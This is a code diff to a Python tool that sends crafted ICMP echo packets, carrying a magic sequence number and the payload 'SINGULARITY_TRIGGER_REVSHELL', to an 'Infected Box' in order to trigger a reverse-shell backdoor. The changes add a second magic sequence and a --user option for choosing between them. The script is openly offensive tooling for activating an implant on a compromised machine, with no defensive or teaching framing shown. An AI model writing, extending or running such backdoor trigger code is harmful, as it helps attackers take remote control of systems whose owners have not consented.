@@ -12,6 +12,7 @@ import sys
 import time
 
 MAGIC_SEQ = 1337
+MAGIC_SEQ2 = 1338
 ICMP_ECHO_REQUEST = 8
 PAYLOAD = b'SINGULARITY_TRIGGER_REVSHELL'
 
@@ -51,7 +52,7 @@ def create_icmp_packet(packet_id, sequence):
     
     return header + PAYLOAD
 
-def send_magic_trigger(target_ip, count=3, interval=1.0):
+def send_magic_trigger(target_ip, count=3, interval=1.0, seq=MAGIC_SEQ):
     
     print(r"""
 ╔═══════════════════════════════════════════════════════╗
@@ -75,7 +76,7 @@ def send_magic_trigger(target_ip, count=3, interval=1.0):
     """)
     
     print(f"[*] Infected Box: {target_ip}")
-    print(f"[*] Magic sequence: {MAGIC_SEQ}")
+    print(f"[*] Magic sequence: {seq}")
     print(f"[*] Sending {count} packets with interval of {interval}s")
     print()
     
@@ -87,7 +88,7 @@ def send_magic_trigger(target_ip, count=3, interval=1.0):
         
         for i in range(count):
             try:
-                packet = create_icmp_packet(packet_id=1337, sequence=MAGIC_SEQ)
+                packet = create_icmp_packet(packet_id=1337, sequence=seq)
                 
                 sock.sendto(packet, (target_ip, 0))
                 
@@ -160,9 +161,23 @@ def main():
     target_ip = sys.argv[1]
     count = 3
     interval = 1.0
+    user = 1
     
     i = 2
     while i < len(sys.argv):
+        if sys.argv[i] in ['-u', '--user']:
+            if i + 1 < len(sys.argv):
+                try:
+                    user = int(sys.argv[i + 1])
+                    if user not in [1, 2]:
+                        print("[!] --user must be 1 or 2")
+                        sys.exit(1)
+                    i += 2
+                    continue
+                except ValueError:
+                    print(f"[!] Invalid value for user: {sys.argv[i + 1]}")
+                    sys.exit(1)
+        
         if sys.argv[i] in ['-c', '--count']:
             if i + 1 < len(sys.argv):
                 try:
@@ -194,7 +209,8 @@ def main():
         print("[!] Interval must be between 0.1 and 10.0 seconds")
         sys.exit(1)
     
-    success = send_magic_trigger(target_ip, count, interval)
+    seq = MAGIC_SEQ if user == 1 else MAGIC_SEQ2
+    success = send_magic_trigger(target_ip, count, interval, seq=seq)
     
     sys.exit(0 if success else 1)
 
